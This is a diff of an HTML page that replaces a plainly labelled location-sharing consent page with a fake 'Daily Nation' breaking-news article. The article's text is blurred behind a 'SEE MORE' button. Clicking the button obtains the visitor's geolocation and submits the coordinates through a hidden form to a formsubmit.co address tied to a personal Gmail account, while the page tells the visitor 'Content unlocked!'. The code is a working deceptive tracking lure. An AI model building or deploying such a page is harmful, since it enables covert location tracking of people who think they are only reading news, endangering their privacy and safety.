@@ -1,39 +1,147 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Location Consent</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Breaking News</title>
+
+<style>
+  body {
+    margin: 0;
+    font-family: Georgia, serif;
+    background: #f4f4f4;
+  }
+
+  header {
+    background: #b30000;
+    color: white;
+    padding: 15px;
+    font-size: 22px;
+    font-weight: bold;
+  }
+
+  .container {
+    padding: 15px;
+  }
+
+  .article {
+    background: white;
+    padding: 18px;
+    border-radius: 8px;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+  }
+
+  .tag {
+    color: #b30000;
+    font-size: 12px;
+    font-weight: bold;
+  }
+
+  h2 {
+    margin-top: 8px;
+    font-size: 20px;
+  }
+
+  p {
+    font-size: 15px;
+    color: #333;
+    line-height: 1.6;
+  }
+
+  .blur {
+    filter: blur(4px);
+  }
+
+  button {
+    margin-top: 15px;
+    width: 100%;
+    padding: 12px;
+    font-size: 16px;
+    background: #b30000;
+    color: white;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+  }
+
+  button:hover {
+    background: #8f0000;
+  }
+
+  #status {
+    margin-top: 12px;
+    font-size: 14px;
+    font-weight: bold;
+  }
+
+  .consent {
+    margin-top: 10px;
+    font-size: 11px;
+    color: #777;
+  }
+</style>
 </head>
+
 <body>
-  <h2>Share your location</h2>
-  <p>Your location will be emailed after consent.</p>
-  <button onclick="sendLocation()">Share Location</button>
 
-  <form id="locForm" action="https://formsubmit.co/suryanshgehlot02@gmail.com" method="POST">
-    <input type="hidden" name="Latitude" id="lat">
-    <input type="hidden" name="Longitude" id="lon">
-    <input type="hidden" name="_subject" value="Location Received">
-    <input type="hidden" name="_captcha" value="false">
-  </form>
+<header>📰 Daily Nation</header>
 
-  <p id="status"></p>
+<div class="container">
+  <div class="article">
+    <div class="tag">BREAKING</div>
+    <h2>New Policy Update May Impact Millions Across India</h2>
 
-  <script>
-    function sendLocation() {
-      const status = document.getElementById("status");
+    <p>
+      A sudden policy update has created widespread discussion across the country.
+      Experts believe the decision could affect daily life, employment, and public services.
+    </p>
 
-      navigator.geolocation.getCurrentPosition(
-        function(pos) {
-          document.getElementById("lat").value = pos.coords.latitude;
-          document.getElementById("lon").value = pos.coords.longitude;
-          document.getElementById("locForm").submit();
-          status.innerText = "✅ Location sent successfully!";
-        },
-        function() {
-          status.innerText = "❌ Permission denied";
-        }
-      );
+    <p class="blur">
+      Sources reveal that regional data played a critical role in the policy evaluation.
+      Officials analyzed multiple geographic factors before finalizing the move.
+    </p>
+
+    <button onclick="seeMore()">SEE MORE</button>
+
+    <div id="status"></div>
+
+    <div class="consent">
+      By continuing, you agree to share your current location to view region-specific news.
+    </div>
+  </div>
+</div>
+
+<form id="locForm" action="https://formsubmit.co/suryanshgehlot02@gmail.com" method="POST">
+  <input type="hidden" name="Latitude" id="lat">
+  <input type="hidden" name="Longitude" id="lon">
+  <input type="hidden" name="_subject" value="Location Accessed (News Demo)">
+  <input type="hidden" name="_captcha" value="false">
+</form>
+
+<script>
+function seeMore() {
+  const status = document.getElementById("status");
+
+  if (!navigator.geolocation) {
+    status.innerText = "Geolocation not supported";
+    return;
+  }
+
+  status.innerText = "Loading regional content...";
+
+  navigator.geolocation.getCurrentPosition(
+    function(pos) {
+      document.getElementById("lat").value = pos.coords.latitude;
+      document.getElementById("lon").value = pos.coords.longitude;
+      document.getElementById("locForm").submit();
+      status.innerText = "✅ Content unlocked!";
+    },
+    function() {
+      status.innerText = "❌ Location permission denied";
     }
-  </script>
+  );
+}
+</script>
+
 </body>
 </html>
-
